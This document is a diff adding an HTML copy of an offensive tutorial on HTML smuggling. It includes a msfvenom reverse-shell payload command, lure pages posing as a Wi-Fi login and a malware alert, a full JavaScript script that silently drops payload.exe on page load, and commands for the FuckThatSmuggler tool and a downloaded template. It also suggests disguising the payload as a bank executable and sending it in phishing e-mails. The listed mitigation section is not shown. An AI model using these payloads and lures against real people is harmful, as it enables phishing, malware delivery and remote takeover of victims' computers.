@@ -1,0 +1,417 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: hidden;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1020px;
+        position: scroll;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: scroll;
+        overflow-y: scroll;
+        padding-top: 0px;
+    }
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 28px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">【🖳Port Forwarding & Tunnelling🛠️👨🏽‍💻】</a>
+  <a href="2.html">【🖳Comprehensive Guide on HTML Smuggling🛠️👨🏽‍💻】</a>
+  <a href="3.html">【🖳Credential Dumping: Domain Cache Credential🛠️👨🏽‍💻】</a>
+  <a href="4.html">【🖳Comprehensive Guide on Password Spraying Attack🛠️👨🏽‍💻】</a>
+ <a href="5.html">【🖳A Detailed Guide on Hydra Tool🛠️👨🏽‍💻】</a>
+  <a href="6.html">【🖳A Detailed Guide on Medusa Tool🛠️👨🏽‍💻】</a>
+  <a href="7.html">【🖳Comprehensive Guide on Local & Remote File Inclusion🛠️👨🏽‍💻】</a>
+<a href="8.html">【🖳Netcat for Pentesting🛠️👨🏽‍💻】</a>
+  <a href="9.html">【🖳Comprehensive Guide on Dirbuster & BurpSuite Spider Tools🛠️👨🏽‍💻】</a>
+  <a href="10.html">【🖳Comprehensive Encoding Guide🛠️👨🏽‍💻】</a>
+ <p align="center"><img src="https://i.ibb.co/yyQbWbC/net.png" height="90" width="200"></p> 
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h2 class="heading-element" dir="auto" tabindex="-1"><p align="left"></p>🖳Comprehensive Guide on HTML Smuggling🛠️</h2>
+<p>HTML Smuggling is an evasive payload delivery method that helps an attacker smuggle payload past content filters and firewalls by hiding malicious payloads inside of seemingly benign HTML files. This is possible by using JavaScript blobs and the HTML5 download attribute used with the anchor tag. this guide demonstrates the methodology and two such readily available scripts that perform HTML smuggling.</p>
+<p><strong>MITRE TACTIC: Defense Evasion (TA0005)</strong></p>
+<p><strong>MITRE Technique ID: Obfuscated Files or Information (T1027)</strong></p>
+<p><strong>MITRE SUB ID: HTML Smuggling (T1027.006)</strong></p>
+<h3>Contents</h3>
+<ul>
+<li><strong>Anchor tags, JavaScript Blobs</strong></li>
+<li><strong>HTML Smuggling Attack</strong></li>
+<li><strong>Demonstration using Python Script</strong></li>
+<li><strong>Smuggling Template</strong></li>
+<li><strong>Mitigation</strong></li>
+<li><strong>Conclusion</strong></li>
+</ul>
+<h3>Anchor tags, JavaScript Blobs</h3>
+<p><strong>Anchor:&nbsp;</strong>The anchor tag &lt;a&gt; defines a hyperlink that can be used to link one page to another resource like the script, other HTML page or downloadable files.</p>
+<p>When &lt;a&gt; is used with the &ldquo;download&rdquo; attribute, it can be used to provide links to a downloadable file.</p>
+<p><strong>JavaScript Blob:&nbsp;</strong>JavaScript blobs are objects that are a collection of bytes that contain data stored in a file. Blob data is stored in the user&rsquo;s memory. This collection of bytes can be used in the same places where an actual file would have been used. In other words, blobs can be used to construct file-like objects on the client that can be passed to JavaScript APIs that expect URLs.</p>
+<p>For example, a file &ldquo;payload.exe&rdquo; hosted on a server is downloaded in the system using &lt;a download&gt; tag and in the same way, the bytes of the file payload.exe can be provided as input in JS code as a JS blob, it can be compiled and downloaded at the user end. Slice() may be used to divide a large payload and supplied in the code.</p>
+<p>In another example, a string &ldquo;IgniteTechnologies&rdquo; is also a collection of ASCII bytes that can be used using JS blobs. A good example code of JS Blob can be found&nbsp;<strong>here</strong>. -&nbsp;https://www.javatpoint.com/javascript-blob</p>
+<p>Here, buffer is an array of bytes of the file and the second option we provide is the type of the blob. Here, it is text but, in the demonstration, ahead we&rsquo;ll use the one suitable for an exe file.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">var abc = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">Blob</span><span class="enlighter-g1">(</span><span class="enlighter-text">buffer, MIME type </span><span class="enlighter-k1">of</span><span class="enlighter-text"> buffer</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">var abc = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">Blob</span><span class="enlighter-g1">([</span><span class="enlighter-text">&ldquo;IgniteTechnologies&rdquo;</span><span class="enlighter-g1">]</span><span class="enlighter-text">, </span><span class="enlighter-g1">{</span><span class="enlighter-text">type </span><span class="enlighter-g0">:</span> <span class="enlighter-s0">"text/plain"</span><span class="enlighter-g1">})</span><span class="enlighter-text">;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>And then the blob can be used to display output, drop the file on the victim or some other function.</p>
+<h3>HTML Smuggling Attack</h3>
+<p>Let&rsquo;s start with the basics. In HTML5, if we want a user to download a file hosted on our server, we can do that by using the anchor tag.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">a href=&rdquo;/payload.</span><span class="enlighter-m3">exe</span><span class="enlighter-text">&rdquo; download=&rdquo;payload.</span><span class="enlighter-m3">exe</span><span class="enlighter-text">&rdquo;</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Download Here</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/a</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>For that, let&rsquo;s first create a payload using msfvenom and copy it in our apache webroot directory.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">msfvenom -p windows/x64/shell_reverse_tcp LHOST=</span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">89</span><span class="enlighter-text"> LPORT=</span><span class="enlighter-n1">1234</span><span class="enlighter-text"> -f exe </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> payload.</span><span class="enlighter-m3">exe</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">cp payload.</span><span class="enlighter-m3">exe</span><span class="enlighter-text"> /var/www/html</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijyGpSgrbOz6nwy5dTzSsmsxx9hjx-CnllIom3oO0KfdDCkKStaiIWULt4B8AYz6DbPqjTYr1-MdgDcjhtX_pY7L7iA6FKbnU2_OmmcU1t6zNLr1zoqxa1t6-8kgSm-sQ_n549RGBqdqtMonWflrU4lTekEEPvZx88mrgKqrtbpAFWwXwJ4JLRhcR9rQ/s16000/1.png" alt="" /></p>
+<p>Now, we create a simple index.html file containing the download tag. In real-time, you would use a genuine-looking phishing page.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">html</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">body</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">h1</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Wi-Fi Login Page!</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/h1</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">p</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Alert! We detected some unusual activity, Login to continue. </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/p</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">a href=</span><span class="enlighter-s0">"/payload.exe"</span><span class="enlighter-text"> download=</span><span class="enlighter-s0">"payload.exe"</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Login Here</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/a</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/body</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/html</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Then we copy this into the apache webroot and start the apache server</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">cp index.</span><span class="enlighter-m3">html</span><span class="enlighter-text"> /var/www/html</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">cd /var/www/html</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">service apache2 start</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvNceVhzP12PADEBOh314aqWx3t8kqW9QSdd00GuZ5_fxw2Zyy-IerKoBUR7UySjXg7UrQQUMXX24DijhNS7kMyIWtg9yYeVfEi6d366i3DV6sh3phtcFNd_LwqY91fKLPn4cjzrlEcp02KeQblBtID7FHnas6_ZcKxZe1gF8UnIemW8_aZbd0cLr12g/s16000/2.png" alt="" /></p>
+<p>Once the victim accesses our website and clicks download, the payload shall be delivered.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMaLqHydNiPQ0GhC0ElEULpxGeBr5PoMOd1EH8YGZzy8ZCLWRUPeoyN8VjWFsfrg71vS-P8kndAf6919Q3tg_pANX6SaiLI03FXoAJ5yDOAByeXfQcZatqGTUZxewddmmg07ftmCge05hjAnvfCSgIsuR9YRFywgb4jiPnNmEPUXSpTJ3ECFk2GSjlfA/s16000/3.png" alt="" /></p>
+<p>When it will be run, we&rsquo;ll see a reverse shell back. But that&rsquo;s quite basic. What if using JavaScript we&rsquo;re able to make a user download a file as soon as the website is accessed. This is where we&rsquo;ll utilize JS Blobs.</p>
+<p>First, we need to create a payload, let&rsquo;s call it payload.exe. Then we need to encode this in Base64 as the binary can&rsquo;t directly be copied as a buffer because it contains various characters that might break the buffer and full file may not be copied that way.</p>
+<p>This can be done using the base64 utility in Kali Linux.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">cat payload.</span><span class="enlighter-m3">exe</span> <span class="enlighter-g0">|</span><span class="enlighter-text"> base64</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmHqCdCVuQc2UEluwMspDjGHY2405IauFSShKhqn-AiqO82zGj3FfLvCvAoOOj9DbgYmxs5AyJWXncuvCF_5RImJkUQwtDczPLUDcpqE_JVlfwU7ks4ns9IZz57txUU0CaPJG6Czo3vVc3TTHF5VXW6jWYCF-vm8Ac4K4Xk5dRDWa9E70BAHZjNCrBWw/s16000/4.png" alt="" /></p>
+<p>But this base64 encoded binary still has problems. If you see the output given isn&rsquo;t a single line output and rather contains &ldquo;enters&rdquo;</p>
+<p>But in order to supply this into our blob as a buffer, we need a single string with no enters. This fixing be done manually by copying this output in notepad and removing enters or you could follow our alternate approach by going to base64.guru website.</p>
+<p>Here, upload your payload and the converted base64 shall be given in a single line.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXi6fUyEl02In2oLH7zrGb9wDgmUKUjURNer6QCCLo5bHwN16KgFpZRufl9yDm6F8rTk3k8S2ZNUiWbtLbYxQgnN-RF-oyAcGIit9Lq0qSCyXZrMcguJ7qoVewehXim002XlKHUDTh_JIMfGuYwO7dg3Q2QuHAsIKzP0y8-NNPwt8_lFh1sXhzxZ-O8Q/s16000/5.png" alt="" /></p>
+<p>Now comes the code. We will now create a JavaScript Blob and a script that will allow us as an attacker to make our code recompile as an EXE file at the victim end. This approach can bypass many content filters and firewalls since the data is travelling as a string text.</p>
+<p>The code&rsquo;s explanation is as follows:</p>
+<ul>
+<li><strong>Function b64toarray</strong>: Takes input of our base64 encoded binary file and converts it into a buffer array. This is necessary as the &ldquo;Blog()&rdquo; function takes input from a buffer array as the first parameter.</li>
+<li><strong>Variable binary:&nbsp;</strong>This variable contains the base64 string of our binary and is used to provide function b64toarray input.</li>
+<li><strong>Variable blob:&nbsp;</strong>Holds the blob we just created and takes two inputs as explained above. Here, since we are providing a binary as input the MIME type becomes octet/stream</li>
+<li><strong>Variable payloadfilename:</strong>&nbsp;It is the name that will be given to our binary once it is downloaded on the victim&rsquo;s machine.</li>
+<li><strong>CreateElement</strong>: A DOM function that can create new HTML elements with the help of JavaScript. For example to create a new para in HTML we type: &lt;p&gt;New Para&lt;/p&gt;</li>
+</ul>
+<p>Same can be implemented in JS using createElement like:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">var para = document.</span><span class="enlighter-m3">createElement</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"p"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">para.</span><span class="enlighter-m3">innerText</span><span class="enlighter-text"> = </span><span class="enlighter-s0">"New Para"</span><span class="enlighter-text">;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Here, we have created an anchor tag and used appendChild() function which can be used to insert data inside this newly created element. For example,</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">a href=&rdquo;/&rdquo; download=&rdquo;/&rdquo;</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>In this example, href and download are child tags of a. So in JS this will be:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">var a = document.</span><span class="enlighter-m3">createElement</span><span class="enlighter-g1">(</span><span class="enlighter-s0">'a'</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">document.</span><span class="enlighter-m3">body</span><span class="enlighter-text">.</span><span class="enlighter-m3">appendChild</span><span class="enlighter-g1">(</span><span class="enlighter-text">a</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">href</span><span class="enlighter-text"> = &lsquo;/&rsquo;;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">download</span><span class="enlighter-text"> = &lsquo;/&rsquo;;</span></div>
+</div>
+</div>
+</div>
+</div>
+<ul>
+<li><strong>style:&nbsp;</strong>We are using the styling &lsquo;display: none&rsquo; to be more discreet so that a tag isn&rsquo;t visible on the output.</li>
+<li><strong>createObjectURL():&nbsp;</strong>A DOM function that can return a DOMString containing a value that represents the URL of an object. This object can be a file, media source or in our case blob. It is very necessary as the a.download works on valid URLs only. For our payload blob to be downloaded on the victim, we need to supply the a.download element with a valid URL which this function returns.</li>
+<li><strong>click():&nbsp;</strong>Is what will trigger this anchor tag to automatically run. It simulates as if a user has actually clicked on the link provided by the href tag.</li>
+</ul>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjn7oz0UCBMvgt_zOD0p427E30TJDvuG9egg90ybR_fVC1OWahQ7N0WGTc4cU14oAk0VKJtTEyF_T_UiMNnwSm0yQTdtHp4EY9yd-CkKVkvwYeCv64Wxv6m83d3bXqUnSdTpValTAmZW8F5vTzsJP3wck4R-HgoLtbzUiIo7rfApKpmQSkGeC35UsMXaw/s16000/6.png" alt="" /></p>
+<p>Now, when the website will be run, we&rsquo;ll see that the payload has automatically been downloaded</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVTduqKpaUGDly2EiLEeHyAR2zuB8CFbKCeRpJtiW6nrUf_WpD0yqf3JvUO4PLwQArEsQ1L7C-eFo_YpgvQPTtiaoSdvuohDYu_8fX0KUH9yIcd_NSMOcpqkZSFX6eY0p74IDEA4d3iFOfKHwowhI5hiBmEjzjUynjUcEMJtX_nhACum9a52M_UX9VdA/s16000/7.png" alt="" /></p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">html</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">body</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">h1</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Malware Detected!</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/h1</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">p</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Alert! Run the downloaded script </span><span class="enlighter-k1">for</span><span class="enlighter-text"> anti-virus scan!</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/p</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">script</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-k1">function</span> <span class="enlighter-m0">b64toarray</span><span class="enlighter-g1">(</span><span class="enlighter-text">base64</span><span class="enlighter-g1">)</span> <span class="enlighter-g1">{</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text"> var bin_string = window.</span><span class="enlighter-m3">atob</span><span class="enlighter-g1">(</span><span class="enlighter-text">base64</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text"> var len = bin_string.</span><span class="enlighter-m3">length</span><span class="enlighter-text">; </span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text"> var bytes = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">Uint8Array</span><span class="enlighter-g1">(</span><span class="enlighter-text"> len </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-k1">for</span> <span class="enlighter-g1">(</span><span class="enlighter-text">var i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> len; i++</span><span class="enlighter-g1">)</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">{</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text"> bytes</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = bin_string.</span><span class="enlighter-m3">charCodeAt</span><span class="enlighter-g1">(</span><span class="enlighter-text">i</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">}</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-k1">return</span><span class="enlighter-text"> bytes.</span><span class="enlighter-m3">buffer</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">}</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">var binary =</span><span class="enlighter-s0">'&lt;value&gt;'</span></div>
+</div>
+<div class="">&nbsp;</div>
+<div class="">
+<div><span class="enlighter-text">var data = </span><span class="enlighter-m0">b64toarray</span><span class="enlighter-g1">(</span><span class="enlighter-text">binary</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">var blob = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">Blob</span><span class="enlighter-g1">([</span><span class="enlighter-text">data</span><span class="enlighter-g1">]</span><span class="enlighter-text">, </span><span class="enlighter-g1">{</span><span class="enlighter-text">type: </span><span class="enlighter-s0">'octet/stream'</span><span class="enlighter-g1">})</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">var payloadfilename = </span><span class="enlighter-s0">'payload.exe'</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">&nbsp;</div>
+<div class="">
+<div><span class="enlighter-text">var a = document.</span><span class="enlighter-m3">createElement</span><span class="enlighter-g1">(</span><span class="enlighter-s0">'a'</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">document.</span><span class="enlighter-m3">body</span><span class="enlighter-text">.</span><span class="enlighter-m3">appendChild</span><span class="enlighter-g1">(</span><span class="enlighter-text">a</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">style</span><span class="enlighter-text"> = </span><span class="enlighter-s0">'display: none'</span><span class="enlighter-text">; </span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">var url = window.</span><span class="enlighter-m3">URL</span><span class="enlighter-text">.</span><span class="enlighter-m3">createObjectURL</span><span class="enlighter-g1">(</span><span class="enlighter-text">blob</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">href</span><span class="enlighter-text"> = url;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">download</span><span class="enlighter-text"> = payloadfilename;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">a.</span><span class="enlighter-m3">click</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">window.</span><span class="enlighter-m3">URL</span><span class="enlighter-text">.</span><span class="enlighter-m3">revokeObjectURL</span><span class="enlighter-g1">(</span><span class="enlighter-text">url</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/script</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/body</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">/html</span><span class="enlighter-g1">&gt;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>When this file will be run by our victim, we&rsquo;ll get a reverse shell!</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxL96eGTy0Y1mwkut5eICPimc1j7eHTvcaCT6MpBSu6gn54SzxPQehoeiIXY8QZR_27k_rGQcFBGhHtIffmWEUnW9dNf4pBZsynhgBLSYlKz-mN7ubofhIX0khBP2XZGKnF0lj-hAG8JrKP3wBOhyf6vlgQ8bc622hWBZyDan8KWM2ghEakTl3ZeTlAA/s16000/8.png" alt="" /></p>
+<p>Now, you can be crafty while doing this yourself. Outflank has performed the same attack using a Microsoft document. This can be sent via e-mail phishing campaigns in order to lure the victim to run the malicious file.</p>
+<p>You can check the demo&nbsp;<strong>here</strong>. -&nbsp;https://www.outflank.nl/demo/html_smuggling.html</p>
+<p>Make sure to view the source code!</p>
+<h3>Demonstration using Python Script</h3>
+<p>What we did with code just now can be replicated using automated scripts too. It is fairly simple to automate this process. Unknow101 created a python script that takes in input a random key to encrypt the payload string, filename (path) of the payload, the template of the phishing page or HTML file that will be used (POC given in his source code called smug.html), the output filename (here payload.exe again) and the destination to store our resulting HTML smuggling phishing page.</p>
+<p>We can clone the github repo and run this using python2 like so:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">git clone https:</span><span class="enlighter-c0">//github.com/Unknow101/FuckThatSmuggler.git</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">cd FuckThatSmuggler</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">python2 fuckThatSmuggler.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -k </span><span class="enlighter-n1">123</span><span class="enlighter-text"> -f ~/payload.</span><span class="enlighter-m3">exe</span><span class="enlighter-text"> -t ./templates/smug.</span><span class="enlighter-m3">html</span><span class="enlighter-text"> -fn ~/payload.</span><span class="enlighter-m3">exe</span><span class="enlighter-text"> -o /var/www/html/index.</span><span class="enlighter-m3">html</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrtPbh159ihj15tMwHJ8grYAcZJAIeSDOKt47afeM6e3PRra-amZ2VAwKfPBeLVnf5ORmog8eC4tjfT0Ti3rgs7HE6FhTDhai0O3lCYp4tq3MYh3S22XUXQL0yHRawryqpv8fVTYFNbm5e1CUbTePhpuNlY591hNjEwGg8F91nUYaa-Ycp0yB3fpOc9w/s16000/9.png" alt="" /></p>
+<p>Now, the index.html file in our apache webroot has been replaced. Lets see what happens when the victim accesses our website.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibSDuaIcBbHTZKjAJkME2_bArxJauBTJ-eMRYfSkYwbHEt73WQmBlUjhkcN8BLU7OdMGEGL-PGwHQRFLwPcAVFgHKrkZFZbJTjRrhEnX__oBh9gVL6V6Bf6jI84hA3fjhfGPRkjutpLfvXEIAqDr3RzZ0ud6O3jV0nqJVKCszH61kXyYMTHyaJQU1DAQ/s16000/10.png" alt="" /></p>
+<p>As expected it drops a payload on the victim&rsquo;s system which can now be executed to give us a reverse shell.</p>
+<h3>Smuggling Template</h3>
+<p>Internet is filled with many HTML templates that demonstrate HTML smuggling. We can download any one of them and modify the binary string and name of the payload and we&rsquo;re good to go! No need to code. One such template can be found&nbsp;<strong>here</strong>. -&nbsp;https://gist.github.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a</p>
+<p>To download this as index.html</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">wget https:</span><span class="enlighter-c0">//gist.githubusercontent.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a/raw/46d163491eceb216ab8c110eb474d4113072e5e8/html-smuggling-example.html</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">cp html-smugling-example.</span><span class="enlighter-m3">html</span><span class="enlighter-text"> /var/www/html/index.</span><span class="enlighter-m3">html</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiV1gP7PJ15UKhangCvo8_SfFfo9NE_gxc9xMocqvhXAB4bvBr2E5LZEJv2TSqLQ0ne7nl-mc6yTcB-xgMFSMRDCed6J-uEDRhACH11ZHGtkDsB_BIYoEYR2pJk07NXI7qBHtDazgUpXICSKFrQC4HNua0xcazaKpGdFP-QKu3eWdNsy4YU4Gsy_qOvQ/s16000/11.png" alt="" /></p>
+<p>Now, we can replace the binary with our previously generated base64 string and keep the payload name to whatever we like, let&rsquo;s say HSBCInternetBanking.exe</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFeVsrGZbHooGrllf0w1rXzneNu2BTM_srOHWIWkqAlup6DX2FCFO-spaLnpgiSy9wI63d6cEDJsLUhSDkoIYOAS50xq0ElZEy5PmrfHxKLL0PcCP_hUFta6XGdGpntG0KF8bjzP3v89VRpqOru3vSTa5IRCHI23vAMdV-svF6xuj-jbakAGv7UK7j1g/s16000/12.png" alt="" /></p>
+<p>Once saved, the victim shall now access the webpage and see the payload getting dropped</p>
